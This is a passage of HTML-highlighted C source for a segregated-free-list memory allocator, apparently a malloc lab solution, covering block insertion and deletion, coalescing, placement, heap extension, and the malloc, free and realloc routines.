class="number">16</span>;</span><br><span class="line">    x = x &gt;&gt; (!!mask * <span class="number">16</span>);</span><br><span class="line">    </span><br><span class="line">    mask = x &amp; <span class="number">0x0000FF00</span>;</span><br><span class="line">    seg_idx = seg_idx + !!mask * <span class="number">8</span>;</span><br><span class="line">    x = x &gt;&gt; (!!mask * <span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">    mask = x &amp; <span class="number">0x000000F0</span>;</span><br><span class="line">    seg_idx = seg_idx + !!mask * <span class="number">4</span>;</span><br><span class="line">    x = x &gt;&gt; (!!mask * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    mask = x &amp; <span class="number">0x0000000C</span>;</span><br><span class="line">    seg_idx = seg_idx + !!mask * <span class="number">2</span>;</span><br><span class="line">    x = x &gt;&gt; (!!mask * <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    mask = x &amp; <span class="number">0x00000002</span>;</span><br><span class="line">    seg_idx = seg_idx + !!mask * <span class="number">1</span>;</span><br><span class="line">    x = x &gt;&gt; (!!mask * <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    mask = x &amp; <span class="number">0x00000001</span>;</span><br><span class="line">    seg_idx = seg_idx + !!mask;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> MAX(<span class="number">0</span>, seg_idx - <span class="number">3</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">insert_freeblock</span><span class="params">(<span class="type">void</span>* bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> seg_idx = find_segidx(GET_SIZE(HDRP(bp)));</span><br><span class="line">    <span class="type">void</span>* nxtp = head_seglp[seg_idx];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Mini block, using LIFO</span></span><br><span class="line">    <span class="keyword">if</span> (seg_idx == <span class="number">0</span>) {</span><br><span class="line">        head_seglp[<span class="number">0</span>] = bp;</span><br><span class="line">        PUT_NXTP(bp, nxtp);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nxtp == <span class="literal">NULL</span>) {</span><br><span class="line">        head_seglp[seg_idx] = bp;</span><br><span class="line">        PUT_PRVP(bp, <span class="literal">NULL</span>);</span><br><span class="line">        PUT_NXTP(bp, <span class="literal">NULL</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="type">void</span>* curp = nxtp;</span><br><span class="line">        nxtp = GET_NXTP(nxtp);</span><br><span class="line">        <span class="keyword">while</span> (nxtp != <span class="literal">NULL</span> &amp;&amp; nxtp &lt; bp) {</span><br><span class="line">            curp = nxtp;</span><br><span class="line">            nxtp = GET_NXTP(nxtp);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (nxtp == <span class="literal">NULL</span>) {</span><br><span class="line">            PUT_NXTP(curp, bp);</span><br><span class="line">            PUT_PRVP(bp, curp);</span><br><span class="line">            PUT_NXTP(bp, <span class="literal">NULL</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            PUT_NXTP(curp, bp);</span><br><span class="line">            PUT_PRVP(bp, curp);</span><br><span class="line">            PUT_NXTP(bp, nxtp);</span><br><span class="line">            PUT_PRVP(nxtp, bp);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> seg_idx;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete_freeblock</span><span class="params">(<span class="type">void</span>* bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> seg_idx = find_segidx(GET_SIZE(HDRP(bp)));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Mini block</span></span><br><span class="line">    <span class="keyword">if</span> (seg_idx == <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">if</span> (head_seglp[<span class="number">0</span>] == bp) {</span><br><span class="line">            head_seglp[<span class="number">0</span>] = GET_NXTP(bp);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="type">void</span>* curp = head_seglp[<span class="number">0</span>];</span><br><span class="line">            <span class="type">void</span>* nxtp = GET_NXTP(curp);</span><br><span class="line">            <span class="keyword">while</span> (!(nxtp == bp)) {</span><br><span class="line">                curp = nxtp;</span><br><span class="line">                nxtp = GET_NXTP(nxtp);</span><br><span class="line">            }</span><br><span class="line">            PUT_NXTP(curp, GET_NXTP(nxtp));</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* prvp = GET_PRVP(bp);</span><br><span class="line">    <span class="type">void</span>* nxtp = GET_NXTP(bp);</span><br><span class="line">    <span class="keyword">if</span> (prvp != <span class="literal">NULL</span>) PUT_NXTP(prvp, nxtp);</span><br><span class="line">    <span class="keyword">if</span> (nxtp != <span class="literal">NULL</span>) PUT_PRVP(nxtp, prvp);</span><br><span class="line">    <span class="keyword">if</span> (head_seglp[seg_idx] == bp)</span><br><span class="line">        head_seglp[seg_idx] = nxtp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_nextblock_alloc_prev</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> value)</span></span><br><span class="line">{</span><br><span class="line">    bp = NEXT_BLKP(bp);</span><br><span class="line">    PUT(HDRP(bp), PACK(GET_SIZE(HDRP(bp)), GET_PREV_MINI(HDRP(bp)), value, GET_ALLOC(HDRP(bp))));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_nextblock_mini_prev</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> mini)</span></span><br><span class="line">{</span><br><span class="line">    bp = NEXT_BLKP(bp);</span><br><span class="line">    PUT(HDRP(bp), PACK(GET_SIZE(HDRP(bp)), mini, GET_PREV_ALLO(HDRP(bp)), GET_ALLOC(HDRP(bp))));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_PREV_ALLO(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) {  }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) {</span><br><span class="line">        <span class="type">void</span>* nxtp = NEXT_BLKP(bp);</span><br><span class="line">        set_nextblock_mini_prev(nxtp, <span class="number">0</span>);</span><br><span class="line">        delete_freeblock(bp);</span><br><span class="line">        delete_freeblock(nxtp);</span><br><span class="line">        size += GET_SIZE(HDRP(nxtp));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, GET_PREV_MINI(HDRP(bp)), <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, GET_PREV_MINI(HDRP(bp)), <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        insert_freeblock(bp); </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) {</span><br><span class="line">        set_nextblock_mini_prev(bp, <span class="number">0</span>);</span><br><span class="line">        <span class="type">void</span>* nxtp = bp;</span><br><span class="line">        bp = GET_PREV_MINI(HDRP(bp)) ? bp - DWORD : PREV_BLKP(bp);</span><br><span class="line">        delete_freeblock(bp);</span><br><span class="line">        delete_freeblock(nxtp);</span><br><span class="line">        size += GET_SIZE(HDRP(bp));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, GET_PREV_MINI(HDRP(bp)), GET_PREV_ALLO(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, GET_PREV_MINI(HDRP(bp)), GET_PREV_ALLO(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">        insert_freeblock(bp);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="type">void</span>* nxtp = bp;</span><br><span class="line">        <span class="type">void</span>* nnxtp = NEXT_BLKP(bp);</span><br><span class="line">        set_nextblock_mini_prev(nnxtp, <span class="number">0</span>);</span><br><span class="line">        bp = GET_PREV_MINI(HDRP(bp)) ? bp - DWORD : PREV_BLKP(bp);</span><br><span class="line">        delete_freeblock(bp);</span><br><span class="line">        delete_freeblock(nxtp);</span><br><span class="line">        delete_freeblock(nnxtp);</span><br><span class="line">        size += GET_SIZE(HDRP(bp)) + GET_SIZE(HDRP(nnxtp));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, GET_PREV_MINI(HDRP(bp)), GET_PREV_ALLO(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, GET_PREV_MINI(HDRP(bp)), GET_PREV_ALLO(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">        insert_freeblock(bp);</span><br><span class="line">    } </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Coalesce neighboring free blocks (if any) for realloc.</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">coalesce_realloc</span><span class="params">(<span class="type">void</span>* bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Merge following free blocks</span></span><br><span class="line">    <span class="type">void</span>* current_bp = bp;</span><br><span class="line">    <span class="keyword">while</span> (!GET_ALLOC(HDRP(NEXT_BLKP(current_bp)))) {</span><br><span class="line">        current_bp = NEXT_BLKP(current_bp);</span><br><span class="line">        delete_freeblock(current_bp);</span><br><span class="line">        size += GET_SIZE(HDRP(current_bp));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Merge prior free blocks</span></span><br><span class="line">    current_bp = bp;</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_PREV_ALLO(HDRP(current_bp));</span><br><span class="line">    <span class="keyword">while</span> (!prev_alloc) {</span><br><span class="line">        current_bp = GET_PREV_MINI(HDRP(bp)) ? current_bp - DWORD : PREV_BLKP(current_bp);</span><br><span class="line">        delete_freeblock(current_bp);</span><br><span class="line">        size += GET_SIZE(HDRP(current_bp));</span><br><span class="line">        prev_alloc = GET_PREV_ALLO(HDRP(current_bp));</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    PUT(HDRP(current_bp), PACK(size, GET_PREV_MINI(HDRP(bp)), prev_alloc, <span class="number">0</span>));</span><br><span class="line">    <span class="type">size_t</span> mini = size &gt; DWORD ? <span class="number">0</span> : <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    set_nextblock_mini_prev(current_bp, mini);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> current_bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">find_fit_better_hit_seglist_immediate</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> seg_idx = find_segidx(asize);</span><br><span class="line">    <span class="type">void</span>* bp;</span><br><span class="line">    <span class="type">void</span>* best_bp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> best_size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> iteration = <span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Mini block</span></span><br><span class="line">    <span class="keyword">if</span> (seg_idx == <span class="number">0</span>) {</span><br><span class="line">        bp = head_seglp[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (bp != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            seg_idx = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (seg_idx &lt; N_SEGLIST) {</span><br><span class="line">        bp = head_seglp[seg_idx];</span><br><span class="line">        <span class="keyword">while</span> (bp != <span class="literal">NULL</span>) {</span><br><span class="line">            <span class="keyword">if</span> (asize &lt;= GET_SIZE(HDRP(bp))) {</span><br><span class="line">                best_bp = bp;</span><br><span class="line">                best_size = GET_SIZE(HDRP(bp));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">            bp = GET_NXTP(bp);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (best_bp != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        seg_idx++;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (best_bp == <span class="literal">NULL</span> || seg_idx == N_SEGLIST) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; iteration &amp;&amp; bp != <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="keyword">if</span> (asize &lt;= GET_SIZE(HDRP(bp)) &amp;&amp; GET_SIZE(HDRP(bp)) &lt; best_size) {</span><br><span class="line">            best_bp = bp;</span><br><span class="line">            best_size = GET_SIZE(HDRP(bp));</span><br><span class="line">        }</span><br><span class="line">        bp = GET_NXTP(bp);</span><br><span class="line">        ++i;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> best_bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span>* bp = find_fit_better_hit_seglist_immediate(asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">place_threshold</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> csize, <span class="type">size_t</span> asize, <span class="type">const</span> <span class="type">size_t</span> threshold)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (asize &gt; threshold) {</span><br><span class="line">        <span class="type">size_t</span> mini = (csize - asize &gt; DWORD) ? <span class="number">0</span> : <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (mini) {</span><br><span class="line">            PUT(HDRP(bp), PACK(csize - asize, GET_PREV_MINI(HDRP(bp)), GET_PREV_ALLO(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            PUT(HDRP(bp), PACK(csize - asize, GET_PREV_MINI(HDRP(bp)), GET_PREV_ALLO(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">            PUT(FTRP(bp), PACK(csize - asize, GET_PREV_MINI(HDRP(bp)), GET_PREV_ALLO(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">        }</span><br><span class="line">        insert_freeblock(bp);</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, mini, <span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">        set_nextblock_alloc_prev(bp, <span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="type">void</span>* v_bp = bp;</span><br><span class="line">        <span class="type">size_t</span> amini = asize &gt; DWORD ? <span class="number">0</span> : <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        <span class="type">size_t</span> cmini = (csize - asize &gt; DWORD) ? <span class="number">0</span> : <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, GET_PREV_MINI(HDRP(bp)), GET_PREV_ALLO(HDRP(bp)), <span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        <span class="keyword">if</span> (cmini) {</span><br><span class="line">            PUT(HDRP(bp), PACK(csize - asize, amini, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            PUT(HDRP(bp), PACK(csize - asize, amini, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">            PUT(FTRP(bp), PACK(csize - asize, amini, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        }</span><br><span class="line">        insert_freeblock(bp);</span><br><span class="line">        set_nextblock_mini_prev(bp, cmini);</span><br><span class="line">        bp = v_bp;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">place_threshold_realloc</span><span class="params">(<span class="type">void</span>* bp, <span class="type">void</span>* n_bp, <span class="type">size_t</span> fsize, <span class="type">size_t</span> asize, <span class="type">size_t</span> psize, <span class="type">const</span> <span class="type">size_t</span> threshold)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">// Be CAREFUL of the instruction order: memcpy &gt; PUT</span></span><br><span class="line">    <span class="keyword">if</span> (asize &gt; threshold) {</span><br><span class="line">        <span class="type">void</span>* m_bp = n_bp;</span><br><span class="line">        <span class="type">size_t</span> mini = (fsize - asize &gt; DWORD) ? <span class="number">0</span> : <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        PUT(HDRP(n_bp), PACK(fsize - asize, GET_PREV_MINI(HDRP(n_bp)), GET_PREV_ALLO(HDRP(n_bp)), <span class="number">0</span>));</span><br><span class="line">        n_bp = NEXT_BLKP(n_bp);</span><br><span class="line">        <span class="built_in">memcpy</span>(n_bp, bp, psize);</span><br><span class="line">        PUT(HDRP(n_bp), PACK(asize, mini, <span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">        set_nextblock_mini_prev(n_bp, <span class="number">0</span>);</span><br><span class="line">        set_nextblock_alloc_prev(n_bp, <span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (!mini) </span><br><span class="line">            PUT(FTRP(m_bp), PACK(fsize - asize, GET_PREV_MINI(HDRP(m_bp)), GET_PREV_ALLO(HDRP(m_bp)), <span class="number">0</span>));</span><br><span class="line">        insert_freeblock(m_bp);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="type">size_t</span> amini = asize &gt; DWORD ? <span class="number">0</span> : <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        <span class="type">size_t</span> fmini = (fsize - asize &gt; DWORD) ? <span class="number">0</span> : <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        PUT(HDRP(n_bp), PACK(asize, GET_PREV_MINI(HDRP(bp)), GET_PREV_ALLO(HDRP(n_bp)), <span class="number">1</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(n_bp, bp, psize);</span><br><span class="line">        bp = n_bp;</span><br><span class="line">        n_bp = NEXT_BLKP(n_bp);</span><br><span class="line">        <span class="keyword">if</span> (fmini) {</span><br><span class="line">            PUT(HDRP(n_bp), PACK(fsize - asize, amini, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        } </span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            PUT(HDRP(n_bp), PACK(fsize - asize, amini, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">            PUT(FTRP(n_bp), PACK(fsize - asize, amini, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        }</span><br><span class="line">        set_nextblock_mini_prev(n_bp, fmini);</span><br><span class="line">        set_nextblock_alloc_prev(n_bp, <span class="number">0</span>);</span><br><span class="line">        insert_freeblock(n_bp);</span><br><span class="line">        n_bp = bp;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> n_bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">place</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">    delete_freeblock(bp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Normal block</span></span><br><span class="line">    <span class="keyword">if</span> (csize &gt;= asize + DWORD) {</span><br><span class="line">        bp = place_threshold(bp, csize, asize, <span class="number">64</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// No split</span></span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        PUT(HDRP(bp), PACK(csize, GET_PREV_MINI(HDRP(bp)), GET_PREV_ALLO(HDRP(bp)), <span class="number">1</span>));</span><br><span class="line">        set_nextblock_alloc_prev(bp, <span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        set_nextblock_mini_prev(bp, csize &gt; DWORD ? <span class="number">0</span> : <span class="number">1</span> &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * SWORD : words * SWORD;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_PREV_ALLO(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> prev_mini = GET_PREV_MINI(HDRP(bp));</span><br><span class="line">    PUT(HDRP(bp), PACK(size, prev_mini, prev_alloc, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, prev_mini, prev_alloc, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">    insert_freeblock(bp);</span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_init - initialize the malloc package.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span>* bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((heap_listp = mem_sbrk(<span class="number">4</span> * SWORD)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    PUT(heap_listp, <span class="number">0</span>);</span><br><span class="line">    PUT(heap_listp + <span class="number">1</span> * SWORD, PACK(DWORD, <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">    PUT(heap_listp + <span class="number">2</span> * SWORD, PACK(DWORD, <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">    PUT(heap_listp + <span class="number">3</span> * SWORD, PACK(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">    heap_listp += <span class="number">2</span> * SWORD;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_SEGLIST; ++i)</span><br><span class="line">        head_seglp[i] = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(CHUNKSIZE / SWORD)) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span></span><br><span class="line"><span class="comment"> *     Always allocate a block whose size is a multiple of the alignment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> asize;</span><br><span class="line">    <span class="type">size_t</span> extendsize;</span><br><span class="line">    <span class="type">char</span>* bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    asize = DWORD * ((size + SWORD + DWORD - <span class="number">1</span>) / DWORD);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="keyword">return</span> place (bp, asize);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendsize / SWORD)) == <span class="literal">NULL</span>)</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">NULL</span>; </span><br><span class="line">    <span class="keyword">return</span> place(bp, asize);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> mini = size &gt; DWORD ? <span class="number">0</span> : <span class="number">1</span> &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_PREV_ALLO(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> prev_mini = GET_PREV_MINI(HDRP(bp));</span><br><span class="line">    PUT(HDRP(bp), PACK(size, prev_mini, prev_alloc, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">if</span> (!mini)</span><br><span class="line">        PUT(FTRP(bp), PACK(size, prev_mini, prev_alloc, <span class="number">0</span>));</span><br><span class="line">    set_nextblock_alloc_prev(bp, <span class="number">0</span>);</span><br><span class="line">    set_nextblock_mini_prev(bp, mini);</span><br><span class="line">    insert_freeblock(bp);</span><br><span class="line">    coalesce(bp);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (bp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) {</span><br><span class="line">        mm_free(bp);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> osize = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> asize = DWORD * ((size + SWORD + DWORD - <span class="number">1</span>) / DWORD);</span><br><span class="line">    <span class="type">size_t</span> psize = MIN(osize, asize) - SWORD;</span><br><span class="line">    </span><br><span class="line">    <span class="type">void</span>* new_bp = coalesce_realloc(bp);</span><br><span class="line">    <span class="type">size_t</span> fsize = GET_SIZE(HDRP(new_bp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Block capacity not enough for realloc</span></span><br><span class="line">    <span class="keyword">if</span> (fsize &lt; asize) {</span><br><span class="line">        <span class="comment">// Next block is epilogue, extend only the size you need</span></span><br><span class="line">        